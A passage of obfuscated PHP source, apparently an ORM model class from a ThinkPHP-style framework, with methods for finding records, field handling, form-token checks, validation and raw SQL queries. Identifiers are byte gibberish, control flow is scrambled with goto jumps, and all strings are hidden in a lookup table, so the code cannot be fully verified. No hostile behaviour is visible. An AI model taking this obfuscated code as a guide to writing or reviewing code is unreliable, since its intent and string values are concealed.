$E³œ†—‹Âİ[$EÙñÚ£…Î[267]] = $this->getTableName(); $B£•ËƒÕ­¢ = $this->fields; } else { $B£•ËƒÕ­¢ = $this->getDbFields(); } if (!empty($E³œ†—‹Âİ[$EÙñÚ£…Î[268]])) { $E³œ†—‹Âİ[$EÙñÚ£…Î[267]] .= $EÙñÚ£…Î[50] . $E³œ†—‹Âİ[$EÙñÚ£…Î[268]]; } $E³œ†—‹Âİ[$EÙñÚ£…Î[269]] = $this->name; goto A¨¹äèÂ‡»; DîÜĞñ²„á: } protected function _options_filter(&$BÒï˜æ¬çÛ) { } protected function _parseType(&$E¥˜óïÕ×Ú, $fŠğº’æë) { $fó²æÎÊš =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($this->options[$fó²æÎÊš[273]][$fó²æÎÊš[4] . $fŠğº’æë])) { $Eêê—çÍÕ = strtolower($this->fields[$fó²æÎÊš[240]][$fŠğº’æë]); if (!1 !== strpos($Eêê—çÍÕ, $fó²æÎÊš[274])) { } elseif (!1 === strpos($Eêê—çÍÕ, $fó²æÎÊš[275]) && !1 !== strpos($Eêê—çÍÕ, $fó²æÎÊš[276])) { $E¥˜óïÕ×Ú[$fŠğº’æë] = intval($E¥˜óïÕ×Ú[$fŠğº’æë]); } elseif (!1 !== strpos($Eêê—çÍÕ, $fó²æÎÊš[277]) || !1 !== strpos($Eêê—çÍÕ, $fó²æÎÊš[278])) { $E¥˜óïÕ×Ú[$fŠğº’æë] = floatval($E¥˜óïÕ×Ú[$fŠğº’æë]); } elseif (!1 !== strpos($Eêê—çÍÕ, $fó²æÎÊš[279])) { $E¥˜óïÕ×Ú[$fŠğº’æë] = (bool) $E¥˜óïÕ×Ú[$fŠğº’æë]; } } } public function find($e‹à±†Ê’ = array()) { goto d¹…•Óù¤™; A´¿ñ¹Ûô«: if (!empty($this->options[$d‚óÇÔÊãá[281]])) { return $this->returnResult($this->data, $this->options[$d‚óÇÔÊãá[281]]); } return $this->data; goto dŒ¦œÍ³Œ×; d¹…•Óù¤™: $d‚óÇÔÊãá =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_numeric($e‹à±†Ê’) || is_string($e‹à±†Ê’)) { $Aùä‚–±©æ[$this->getPk()] = intval($e‹à±†Ê’); $this->options[$d‚óÇÔÊãá[263]] = $Aùä‚–±©æ; } $this->options[$d‚óÇÔÊãá[280]] = 1; goto C×œ­š’¡; C×œ­š’¡: $e‹à±†Ê’ = $this->_parseOptions(); $f§èÖ¦²¸¢ = $this->db->select($e‹à±†Ê’); if (!1 === $f§èÖ¦²¸¢) { return !1; } goto C†Ö”¯Ô‡´; C†Ö”¯Ô‡´: if (empty($f§èÖ¦²¸¢)) { return null; } $this->data = $f§èÖ¦²¸¢[0]; $this->_afterFind($this->data, $e‹à±†Ê’); goto A´¿ñ¹Ûô«; dŒ¦œÍ³Œ×: } protected function _afterFind(&$EœÅò‰¬í, $dİĞóœˆ) { } protected function returnResult($E´Õâ‰»İ, $d¹‹äíÙŸ = '') { $cÈí ¨İƒè =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($d¹‹äíÙŸ) { if (is_callable($d¹‹äíÙŸ)) { return call_user_func($d¹‹äíÙŸ, $E´Õâ‰»İ); } switch (strtolower($d¹‹äíÙŸ)) { case $cÈí ¨İƒè[282]: return json_encode($E´Õâ‰»İ); case $cÈí ¨İƒè[283]: return xml_encode($E´Õâ‰»İ); } } return $E´Õâ‰»İ; } public function parseFieldsMap($C½›Åê³È¬, $fì³‹¶İîÈ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $F˜¹…·•Š† => $DŒµ ¯ÔÕô) { if ($fì³‹¶İîÈ == 1) { if (isset($C½›Åê³È¬[$DŒµ ¯ÔÕô])) { $C½›Åê³È¬[$F˜¹…·•Š†] = $C½›Åê³È¬[$DŒµ ¯ÔÕô]; unset($C½›Åê³È¬[$DŒµ ¯ÔÕô]); } } else { if (isset($C½›Åê³È¬[$F˜¹…·•Š†])) { $C½›Åê³È¬[$DŒµ ¯ÔÕô] = $C½›Åê³È¬[$F˜¹…·•Š†]; unset($C½›Åê³È¬[$F˜¹…·•Š†]); } } } } return $C½›Åê³È¬; } public function setField($bö¦”â´ÀÁ, $bè®ö·ÙºÔ = '') { if (is_array($bö¦”â´ÀÁ)) { $eø”¾›¥¢† = $bö¦”â´ÀÁ; } else { $eø”¾›¥¢†[$bö¦”â´ÀÁ] = $bè®ö·ÙºÔ; } return $this->save($eø”¾›¥¢†); } public function setAdd($Aİ·‹“Ìéœ, $D–çœÔ²ñ = 1) { $D‰˜èÂñ¬¤ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a•ÁœÈÍ†Ã = $Aİ·‹“Ìéœ . $D‰˜èÂñ¬¤[284] . $D–çœÔ²ñ; if ($D–çœÔ²ñ < 0) { $a•ÁœÈÍ†Ã = $Aİ·‹“Ìéœ . $D–çœÔ²ñ; } return $this->setField($Aİ·‹“Ìéœ, array($D‰˜èÂñ¬¤[285], $a•ÁœÈÍ†Ã)); } public function getField($a½ÖÕè¾°â, $DÌİãíš÷ = null) { $DŒ˜ß”á× =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d˜³âŠ[$DŒ˜ß”á×[261]] = $a½ÖÕè¾°â; $d˜³âŠ = $this->_parseOptions($d˜³âŠ); $a½ÖÕè¾°â = trim($a½ÖÕè¾°â); if (strpos($a½ÖÕè¾°â, $DŒ˜ß”á×[47])) { if (!isset($d˜³âŠ[$DŒ˜ß”á×[280]])) { $d˜³âŠ[$DŒ˜ß”á×[280]] = is_numeric($DÌİãíš÷) ? $DÌİãíš÷ : $DŒ˜ß”á×[33]; } $e¢”’Ğ¾Áï = $this->db->select($d˜³âŠ); if (!empty($e¢”’Ğ¾Áï)) { goto CĞĞÚ¨³È»; aš½—Ç²: $aö½æ¯¶„‹ = array_shift($a½ÖÕè¾°â); $CË¡öù¨Ä = array(); $EùÙã»«³¬ = count($f´‹±ÛàÙö); goto EÎ¡Úİ½; CĞĞÚ¨³È»: $f´‹±ÛàÙö = explode($DŒ˜ß”á×[47], $a½ÖÕè¾°â); $a½ÖÕè¾°â = array_keys($e¢”’Ğ¾Áï[0]); $b›ºè§ÇÛñ = array_shift($a½ÖÕè¾°â); goto aš½—Ç²; EÎ¡Úİ½: foreach ($e¢”’Ğ¾Áï as $cÎ‡ó¦Ÿ¶…) { $b Ğ‰òéœ = $cÎ‡ó¦Ÿ¶…[$b›ºè§ÇÛñ]; if (2 == $EùÙã»«³¬) { $CË¡öù¨Ä[$b Ğ‰òéœ] = $cÎ‡ó¦Ÿ¶…[$aö½æ¯¶„‹]; } else { $CË¡öù¨Ä[$b Ğ‰òéœ] = is_string($DÌİãíš÷) ? implode($DÌİãíš÷, $cÎ‡ó¦Ÿ¶…) : $cÎ‡ó¦Ÿ¶…; } } return $CË¡öù¨Ä; goto AÜ­‘ğŞ“; AÜ­‘ğŞ“: } } else { if (!0 !== $DÌİãíš÷) { $d˜³âŠ[$DŒ˜ß”á×[280]] = is_numeric($DÌİãíš÷) ? $DÌİãíš÷ : 1; } if ($DÌİãíš÷ === $DŒ˜ß”á×[243]) { unset($d˜³âŠ[$DŒ˜ß”á×[280]]); } $cÎ‡ó¦Ÿ¶… = $this->db->select($d˜³âŠ); if (!empty($cÎ‡ó¦Ÿ¶…)) { if ($DÌİãíš÷ === $DŒ˜ß”á×[243]) { return reset($cÎ‡ó¦Ÿ¶…[0]); } if (!0 !== $DÌİãíš÷ && 1 == $d˜³âŠ[$DŒ˜ß”á×[280]]) { return reset($cÎ‡ó¦Ÿ¶…[0]); } foreach ($cÎ‡ó¦Ÿ¶… as $FÆ‡…Ä‹Ù¯) { $AÀğÇõ÷Û[] = $FÆ‡…Ä‹Ù¯[$a½ÖÕè¾°â]; } return $AÀğÇõ÷Û; } } return null; } public function create($a¦Ô×èÚš = '', $Bœîé¶ğŠê = '') { goto fŒæ¾¡ÈÖÈ; B«Ï¿ã–¥ğ: $a¦Ô×èÚš = $this->parseFieldsMap($a¦Ô×èÚš, 0); $Bœîé¶ğŠê = $Bœîé¶ğŠê ? $Bœîé¶ğŠê : (!empty($a¦Ô×èÚš[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$bôø˜µæŞ[261]])) { $Aù‹õâ‰¿Ú = $this->options[$bôø˜µæŞ[261]]; unset($this->options[$bôø˜µæŞ[261]]); } elseif ($Bœîé¶ğŠê == THINK_MODEL_INSERT && isset($this->insertFields)) { $Aù‹õâ‰¿Ú = $this->insertFields; } elseif ($Bœîé¶ğŠê == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Aù‹õâ‰¿Ú = $this->updateFields; } goto E¦õÛµù«Ã; fŒæ¾¡ÈÖÈ: $bôø˜µæŞ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($a¦Ô×èÚš)) { $a¦Ô×èÚš = $_POST; } elseif (is_object($a¦Ô×èÚš)) { $a¦Ô×èÚš = get_object_vars($a¦Ô×èÚš); } if (empty($a¦Ô×èÚš) || !is_array($a¦Ô×èÚš)) { $this->error = think_lang($bôø˜µæŞ[259]); return !1; } goto B«Ï¿ã–¥ğ; FÜ·£å¯°›: return $a¦Ô×èÚš; goto Aˆ¯˜™Ø–; b¢Ú—ÒÒ†•: if ($this->autoCheckFields) { $Aù‹õâ‰¿Ú = $this->getDbFields(); foreach ($a¦Ô×èÚš as $B·ô ö¢á => $d¯Œ‚‘¤Ù) { if (!in_array($B·ô ö¢á, $Aù‹õâ‰¿Ú)) { unset($a¦Ô×èÚš[$B·ô ö¢á]); } elseif (MAGIC_QUOTES_GPC && is_string($d¯Œ‚‘¤Ù)) { $a¦Ô×èÚš[$B·ô ö¢á] = stripslashes($d¯Œ‚‘¤Ù); } } } $this->autoOperation($a¦Ô×èÚš, $Bœîé¶ğŠê); $this->data = $a¦Ô×èÚš; goto FÜ·£å¯°›; E¦õÛµù«Ã: if (isset($Aù‹õâ‰¿Ú)) { if (is_string($Aù‹õâ‰¿Ú)) { $Aù‹õâ‰¿Ú = explode($bôø˜µæŞ[47], $Aù‹õâ‰¿Ú); } if (think_config($bôø˜µæŞ[286])) { $Aù‹õâ‰¿Ú[] = think_config($bôø˜µæŞ[287]); } foreach ($a¦Ô×èÚš as $B·ô ö¢á => $d¯Œ‚‘¤Ù) { if (!in_array($B·ô ö¢á, $Aù‹õâ‰¿Ú)) { unset($a¦Ô×èÚš[$B·ô ö¢á]); } } } if (!$this->autoValidation($a¦Ô×èÚš, $Bœîé¶ğŠê)) { return !1; } if (!$this->autoCheckToken($a¦Ô×èÚš)) { $this->error = think_lang($bôø˜µæŞ[288]); return !1; } goto b¢Ú—ÒÒ†•; Aˆ¯˜™Ø–: } public function autoCheckToken($aÔ´ˆ³ˆ¾Ü) { $D‘à¹ö×¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset($this->options[$D‘à¹ö×¶[289]]) && !$this->options[$D‘à¹ö×¶[289]]) { return !0; } if (think_config($D‘à¹ö×¶[286])) { $C’İãÀİ© = think_config($D‘à¹ö×¶[287]); if (!isset($aÔ´ˆ³ˆ¾Ü[$C’İãÀİ©]) || Session::get($C’İãÀİ©)) { return !1; } list($fŒ‚Ò¤ù, $bˆàô ²Š‘) = explode($D‘à¹ö×¶[70], $aÔ´ˆ³ˆ¾Ü[$C’İãÀİ©]); if ($bˆàô ²Š‘ && Session::get($C’İãÀİ© . $D‘à¹ö×¶[91] . $fŒ‚Ò¤ù) === $bˆàô ²Š‘) { Session::remove($C’İãÀİ© . $D‘à¹ö×¶[91] . $fŒ‚Ò¤ù); return !0; } if (think_config($D‘à¹ö×¶[290])) { Session::remove($C’İãÀİ© . $D‘à¹ö×¶[91] . $fŒ‚Ò¤ù); } return !1; } return !0; } public function regex($bÆò‚†œÀÅ, $E¼£°ƒäŸ¢) { $A«ôËºøö¦ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DĞ ëÁˆÑ = array($A«ôËºøö¦[291] => $A«ôËºøö¦[292], $A«ôËºøö¦[293] => $A«ôËºøö¦[294], $A«ôËºøö¦[295] => $A«ôËºøö¦[296], $A«ôËºøö¦[297] => $A«ôËºøö¦[298], $A«ôËºøö¦[299] => $A«ôËºøö¦[300], $A«ôËºøö¦[301] => $A«ôËºøö¦[302], $A«ôËºøö¦[303] => $A«ôËºøö¦[304], $A«ôËºøö¦[278] => $A«ôËºøö¦[305], $A«ôËºøö¦[306] => $A«ôËºøö¦[307]); if (isset($DĞ ëÁˆÑ[strtolower($E¼£°ƒäŸ¢)])) { $E¼£°ƒäŸ¢ = $DĞ ëÁˆÑ[strtolower($E¼£°ƒäŸ¢)]; } return preg_match($E¼£°ƒäŸ¢, $bÆò‚†œÀÅ) === 1; } private function autoOperation(&$cÇÃ‡†”õÙ, $dƒ‹šŒ„) { $eïìç Ì§Î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!empty($this->options[$eïìç Ì§Î[308]])) { $aó¯ÏàŠöƒ = $this->options[$eïìç Ì§Î[308]]; unset($this->options[$eïìç Ì§Î[308]]); } elseif (!empty($this->_auto)) { $aó¯ÏàŠöƒ = $this->_auto; } if (isset($aó¯ÏàŠöƒ)) { foreach ($aó¯ÏàŠöƒ as $eˆã¢É¨) { if (empty($eˆã¢É¨[2])) { $eˆã¢É¨[2] = THINK_MODEL_INSERT; } if ($dƒ‹šŒ„ == $eˆã¢É¨[2] || $eˆã¢É¨[2] == THINK_MODEL_BOTH) { switch (trim($eˆã¢É¨[3])) { case $eïìç Ì§Î[309]: case $eïìç Ì§Î[310]: $c‹ÕÅ£êƒ» = isset($eˆã¢É¨[4]) ? (array) $eˆã¢É¨[4] : array(); if (isset($cÇÃ‡†”õÙ[$eˆã¢É¨[0]])) { array_unshift($c‹ÕÅ£êƒ», $cÇÃ‡†”õÙ[$eˆã¢É¨[0]]); } if ($eïìç Ì§Î[309] == $eˆã¢É¨[3]) { $cÇÃ‡†”õÙ[$eˆã¢É¨[0]] = call_user_func_array($eˆã¢É¨[1], $c‹ÕÅ£êƒ»); } else { $cÇÃ‡†”õÙ[$eˆã¢É¨[0]] = call_user_func_array(array(&$this, $eˆã¢É¨[1]), $c‹ÕÅ£êƒ»); } break; case $eïìç Ì§Î[261]: $cÇÃ‡†”õÙ[$eˆã¢É¨[0]] = $cÇÃ‡†”õÙ[$eˆã¢É¨[1]]; break; case $eïìç Ì§Î[311]: if ($eïìç Ì§Î[33] === $cÇÃ‡†”õÙ[$eˆã¢É¨[0]]) { unset($cÇÃ‡†”õÙ[$eˆã¢É¨[0]]); } break; case $eïìç Ì§Î[312]: default: $cÇÃ‡†”õÙ[$eˆã¢É¨[0]] = $eˆã¢É¨[1]; } if (!1 === $cÇÃ‡†”õÙ[$eˆã¢É¨[0]]) { unset($cÇÃ‡†”õÙ[$eˆã¢É¨[0]]); } } } } return $cÇÃ‡†”õÙ; } protected function autoValidation($bê¼«§†Ã², $cİó”ÂÙğİ) { $Eïß¤Ü²‹Ø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!empty($this->options[$Eïß¤Ü²‹Ø[313]])) { $a°¸²¡ÌÏÜ = $this->options[$Eïß¤Ü²‹Ø[313]]; unset($this->options[$Eïß¤Ü²‹Ø[313]]); } elseif (!empty($this->_validate)) { $a°¸²¡ÌÏÜ = $this->_validate; } if (isset($a°¸²¡ÌÏÜ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($a°¸²¡ÌÏÜ as $Eºé¥…éõù => $d‘–ôÁÒÇ) { if (empty($d‘–ôÁÒÇ[5]) || $d‘–ôÁÒÇ[5] == THINK_MODEL_BOTH || $d‘–ôÁÒÇ[5] == $cİó”ÂÙğİ) { if (0 == strpos($d‘–ôÁÒÇ[2], $Eïß¤Ü²‹Ø[314]) && strpos($d‘–ôÁÒÇ[2], $Eïß¤Ü²‹Ø[315])) { $d‘–ôÁÒÇ[2] = think_lang(substr($d‘–ôÁÒÇ[2], 2, -1)); } $d‘–ôÁÒÇ[3] = isset($d‘–ôÁÒÇ[3]) ? $d‘–ôÁÒÇ[3] : THINK_EXISTS_VALIDATE; $d‘–ôÁÒÇ[4] = isset($d‘–ôÁÒÇ[4]) ? $d‘–ôÁÒÇ[4] : $Eïß¤Ü²‹Ø[316]; switch ($d‘–ôÁÒÇ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($bê¼«§†Ã², $d‘–ôÁÒÇ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Eïß¤Ü²‹Ø[33] != trim($bê¼«§†Ã²[$d‘–ôÁÒÇ[0]])) { if (!1 === $this->_validationField($bê¼«§†Ã², $d‘–ôÁÒÇ)) { return !1; } } break; default: if (isset($bê¼«§†Ã²[$d‘–ôÁÒÇ[0]])) { if (!1 === $this->_validationField($bê¼«§†Ã², $d‘–ôÁÒÇ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Bš¿„¨ŒÔ¡, $bø¿ïå·×) { if (!1 === $this->_validationFieldItem($Bš¿„¨ŒÔ¡, $bø¿ïå·×)) { if ($this->patchValidate) { $this->error[$bø¿ïå·×[0]] = $bø¿ïå·×[2]; } else { $this->error = $bø¿ïå·×[2]; return !1; } } return; } protected function _validationFieldItem($eÏø¼ñŠ–Œ, $d”’´Ë¥Òº) { $CÓ³—ÔÑÄÎ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; switch (strtolower(trim($d”’´Ë¥Òº[4]))) { case $CÓ³—ÔÑÄÎ[309]: case $CÓ³—ÔÑÄÎ[310]: $B¯°›ëö¦ = isset($d”’´Ë¥Òº[6]) ? (array) $d”’´Ë¥Òº[6] : array(); if (is_string($d”’´Ë¥Òº[0]) && strpos($d”’´Ë¥Òº[0], $CÓ³—ÔÑÄÎ[47])) { $d”’´Ë¥Òº[0] = explode($CÓ³—ÔÑÄÎ[47], $d”’´Ë¥Òº[0]); } if (is_array($d”’´Ë¥Òº[0])) { foreach ($d”’´Ë¥Òº[0] as $Fíğ‚­¦Úä) { $E„ÇæŞ˜ô[$Fíğ‚­¦Úä] = $eÏø¼ñŠ–Œ[$Fíğ‚­¦Úä]; } array_unshift($B¯°›ëö¦, $E„ÇæŞ˜ô); } else { array_unshift($B¯°›ëö¦, $eÏø¼ñŠ–Œ[$d”’´Ë¥Òº[0]]); } if ($CÓ³—ÔÑÄÎ[309] == $d”’´Ë¥Òº[4]) { return call_user_func_array($d”’´Ë¥Òº[1], $B¯°›ëö¦); } else { return call_user_func_array(array(&$this, $d”’´Ë¥Òº[1]), $B¯°›ëö¦); } case $CÓ³—ÔÑÄÎ[317]: return $eÏø¼ñŠ–Œ[$d”’´Ë¥Òº[0]] == $eÏø¼ñŠ–Œ[$d”’´Ë¥Òº[1]]; case $CÓ³—ÔÑÄÎ[318]: if (is_string($d”’´Ë¥Òº[0]) && strpos($d”’´Ë¥Òº[0], $CÓ³—ÔÑÄÎ[47])) { $d”’´Ë¥Òº[0] = explode($CÓ³—ÔÑÄÎ[47], $d”’´Ë¥Òº[0]); } $e…»Õ£š³È = array(); if (is_array($d”’´Ë¥Òº[0])) { foreach ($d”’´Ë¥Òº[0] as $Fíğ‚­¦Úä) { $e…»Õ£š³È[$Fíğ‚­¦Úä] = $eÏø¼ñŠ–Œ[$Fíğ‚­¦Úä]; } } else { $e…»Õ£š³È[$d”’´Ë¥Òº[0]] = $eÏø¼ñŠ–Œ[$d”’´Ë¥Òº[0]]; } if (!empty($eÏø¼ñŠ–Œ[$this->getPk()])) { $e…»Õ£š³È[$this->getPk()] = array($CÓ³—ÔÑÄÎ[319], $eÏø¼ñŠ–Œ[$this->getPk()]); } if ($this->where($e…»Õ£š³È)->find()) { return !1; } return !0; default: return $this->check($eÏø¼ñŠ–Œ[$d”’´Ë¥Òº[0]], $d”’´Ë¥Òº[1], $d”’´Ë¥Òº[4]); } } public function check($e¢õ«ÔÍÖ, $D¶‚Öè¶ê, $dñ Æ¾§èô = "\162\145\147\x65\x78") { $FÁèÅš—½ƒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dñ Æ¾§èô = strtolower(trim($dñ Æ¾§èô)); switch ($dñ Æ¾§èô) { case $FÁèÅš—½ƒ[7]: case $FÁèÅš—½ƒ[320]: $Cœêñ‚ñ = is_array($D¶‚Öè¶ê) ? $D¶‚Öè¶ê : explode($FÁèÅš—½ƒ[47], $D¶‚Öè¶ê); return $dñ Æ¾§èô == $FÁèÅš—½ƒ[7] ? in_array($e¢õ«ÔÍÖ, $Cœêñ‚ñ) : !in_array($e¢õ«ÔÍÖ, $Cœêñ‚ñ); case $FÁèÅš—½ƒ[321]: case $FÁèÅš—½ƒ[322]: if (is_array($D¶‚Öè¶ê)) { $dÑºÆ³±¸¸ = $D¶‚Öè¶ê[0]; $dÎ’ ù’Ô = $D¶‚Öè¶ê[1]; } else { list($dÑºÆ³±¸¸, $dÎ’ ù’Ô) = explode($FÁèÅš—½ƒ[47], $D¶‚Öè¶ê); } return $dñ Æ¾§èô == $FÁèÅš—½ƒ[321] ? $e¢õ«ÔÍÖ >= $dÑºÆ³±¸¸ && $e¢õ«ÔÍÖ <= $dÎ’ ù’Ô : $e¢õ«ÔÍÖ < $dÑºÆ³±¸¸ || $e¢õ«ÔÍÖ > $dÎ’ ù’Ô; case $FÁèÅš—½ƒ[323]: case $FÁèÅš—½ƒ[324]: return $dñ Æ¾§èô == $FÁèÅš—½ƒ[323] ? $e¢õ«ÔÍÖ == $D¶‚Öè¶ê : $e¢õ«ÔÍÖ != $D¶‚Öè¶ê; case $FÁèÅš—½ƒ[325]: $DÏŸ‰õŸ = mb_strlen($e¢õ«ÔÍÖ, $FÁèÅš—½ƒ[326]); if (strpos($D¶‚Öè¶ê, $FÁèÅš—½ƒ[47])) { list($dÑºÆ³±¸¸, $dÎ’ ù’Ô) = explode($FÁèÅš—½ƒ[47], $D¶‚Öè¶ê); return $DÏŸ‰õŸ >= $dÑºÆ³±¸¸ && $DÏŸ‰õŸ <= $dÎ’ ù’Ô; } else { return $DÏŸ‰õŸ == $D¶‚Öè¶ê; } case $FÁèÅš—½ƒ[327]: list($cÙÆåŒ¦Ï, $FŒ‹‹šÀ) = explode($FÁèÅš—½ƒ[47], $D¶‚Öè¶ê); if (!is_numeric($cÙÆåŒ¦Ï)) { $cÙÆåŒ¦Ï = strtotime($cÙÆåŒ¦Ï); } if (!is_numeric($FŒ‹‹šÀ)) { $FŒ‹‹šÀ = strtotime($FŒ‹‹šÀ); } return NOW_TIME >= $cÙÆåŒ¦Ï && NOW_TIME <= $FŒ‹‹šÀ; case $FÁèÅš—½ƒ[328]: return in_array(get_client_ip(), explode($FÁèÅš—½ƒ[47], $D¶‚Öè¶ê)); case $FÁèÅš—½ƒ[329]: return !in_array(get_client_ip(), explode($FÁèÅš—½ƒ[47], $D¶‚Öè¶ê)); case $FÁèÅš—½ƒ[316]: default: return $this->regex($e¢õ«ÔÍÖ, $D¶‚Öè¶ê); } } public function query($d¼è»­ÓÑî, $f£áÓñÕì¤ = false) { $a¦Ê¾Çë°Á =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!is_bool($f£áÓñÕì¤) && !is_array($f£áÓñÕì¤)) { $f£áÓñÕì¤ = func_get_args(); array_shift($f£áÓñÕì¤); } $d¼è»­ÓÑî = str_replace(array($a¦Ê¾Çë°Á[217], $a¦Ê¾Çë°Á[330]), $a¦Ê¾Çë°Á[50], $d¼è»­ÓÑî); $d¼è»­ÓÑî = $this->parseSql($d¼è»­ÓÑî, $f£áÓñÕì¤); return $this->db->query($d¼è»­ÓÑî); } public function execute($cãåŠàõâ¹, $E„¦ï‚ïñ = false) { if (!is_bool($E„¦ï‚ïñ) && !is_array($E„¦ï‚ïñ)) { $E„¦ï‚ïñ = func_get_args(); array_shift($E„¦ï‚ïñ); } $cãåŠàõâ¹ = $this->parseSql($cãåŠàõâ¹, $E„¦ï‚ïñ); return $this->db->execute($cãåŠàõâ¹); } protected function parseSql($Cø³Êƒñ­, $BÏƒàÒŒ£) { $Fêší™ê¾ß =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!0 === $BÏƒàÒŒ£) { $FÃˆôƒç = $this->_parseOptions(); $Cø³Êƒñ­ = $this->db->parseSql($Cø³Êƒñ­, $FÃˆôƒç); } elseif (is_array($BÏƒàÒŒ£)) { $BÏƒàÒŒ£ = array_map(array($this->db, $Fêší™ê¾ß[331]), $BÏƒàÒŒ£); $Cø³Êƒñ­ = vsprintf($Cø³Êƒñ­, $BÏƒàÒŒ£); } else { $Cø³Êƒñ­ = strtr($Cø³Êƒñ­, array($Fêší™ê¾ß[332] => $this->getTableName(), $Fêší™ê¾ß[333] => think_config($Fêší™ê¾ß[232]))); } $this->db->setModel($this->name); return $Cø³Êƒñ­; } public function db($dÆİÕËïÛŠ = '', $eÂòÜÓçö = '', $B…á™•ò = array()) { goto cï½„¤›‘µ; C«÷Òö¸í: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto eĞÑ–—ğê·; cï½„¤›‘µ: $fìÇØª½Ì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($fìÇØª½Ì[33] === $dÆİÕËïÛŠ && $this->db) { return $this->db; } static $cñî÷Ò‰ˆÂ = array(); goto Cåá•ïŸ¸¼; f‹æôÁäÏ•: $cñî÷Ò‰ˆÂ[$dÆİÕËïÛŠ] = $eÂòÜÓçö; $this->db = $Dé°‹¸¾º–[$dÆİÕËïÛŠ]; $this->_after_db(); goto C«÷Òö¸í; Cåá•ïŸ¸¼: static $Dé°‹¸¾º– = array(); if (!isset($Dé°‹¸¾º–[$dÆİÕËïÛŠ]) || isset($Dé°‹¸¾º–[$dÆİÕËïÛŠ]) && $eÂòÜÓçö && $cñî÷Ò‰ˆÂ[$dÆİÕËïÛŠ] != $eÂòÜÓçö) { if (!empty($eÂòÜÓçö) && is_string($eÂòÜÓçö) && !1 === strpos($eÂòÜÓçö, $fìÇØª½Ì[8])) { $eÂòÜÓçö = think_config($eÂòÜÓçö); } $Dé°‹¸¾º–[$dÆİÕËïÛŠ] = Db::getInstance($eÂòÜÓçö); } elseif (NULL === $eÂòÜÓçö) { $Dé°‹¸¾º–[$dÆİÕËïÛŠ]->close(); unset($Dé°‹¸¾º–[$dÆİÕËïÛŠ]); return; } if (!empty($B…á™•ò)) { if (is_string($B…á™•ò)) { parse_str($B…á™•ò, $B…á™•ò); } foreach ($B…á™•ò as $F«˜ª‡ğÖö => $a¯Á¿»¾ï¬) { $this->setProperty($F«˜ª‡ğÖö, $a¯Á¿»¾ï¬); } } goto f‹æôÁäÏ•; eĞÑ–—ğê·: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $a‡õÓ—ğ¦÷ = get_class($this); if ($a‡õÓ—ğ¦÷ == $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][334]) { return $this->name; } $this->name = substr($a‡õÓ—ğ¦÷, 0, -5); } return $this->name; } public function getTableName() { $AÒªâ¸°ˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($this->trueTableName)) { $b±°Ô­µ–™ = !empty($this->tablePrefix) ? $this->tablePrefix : $AÒªâ¸°ˆ[33]; if (!empty($this->tableName)) { $b±°Ô­µ–™ .= $this->tableName; } else { $b±°Ô­µ–™ .= think_parse_name($this->name); } $this->trueTableName = strtolower($b±°Ô­µ–™); } return (!empty($this->dbName) ? $this->dbName . $AÒªâ¸°ˆ[91] : $AÒªâ¸°ˆ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $d• Ğ´î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return isset($this->fields[$d• Ğ´î[239]]) ? $this->fields[$d• Ğ´î[239]] : $this->pk; } public function getDbFields() { $FîŠÍœÙ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset($this->options[$FîŠÍœÙ[267]])) { $DÃ¡ôÎ°ìè = $this->db->getFields($this->options[$FîŠÍœÙ[267]]); return $DÃ¡ôÎ°ìè ? array_keys($DÃ¡ôÎ°ìè) : !1; } if ($this->fields) { $DÃ¡ôÎ°ìè = $this->fields; unset($DÃ¡ôÎ°ìè[$FîŠÍœÙ[238]], $DÃ¡ôÎ°ìè[$FîŠÍœÙ[239]], $DÃ¡ôÎ°ìè[$FîŠÍœÙ[240]], $DÃ¡ôÎ°ìè[$FîŠÍœÙ[237]]); return $DÃ¡ôÎ°ìè; } return !1; } public function data($E’Òë¿ÖĞŞ = '') { $D˜˜è¹«Š« =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($D˜˜è¹«Š«[33] === $E’Òë¿ÖĞŞ && !empty($this->data)) { return $this->data; } if (is_object($E’Òë¿ÖĞŞ)) { $E’Òë¿ÖĞŞ = get_object_vars($E’Òë¿ÖĞŞ); } elseif (is_string($E’Òë¿ÖĞŞ)) { parse_str($E’Òë¿ÖĞŞ, $E’Òë¿ÖĞŞ); } elseif (!is_array($E’Òë¿ÖĞŞ)) { think_exception(think_lang($D˜˜è¹«Š«[259])); } $this->data = $E’Òë¿ÖĞŞ; return $this; } public function join($B÷·ã‹…‰) { $C‘…ˆí®ë =& 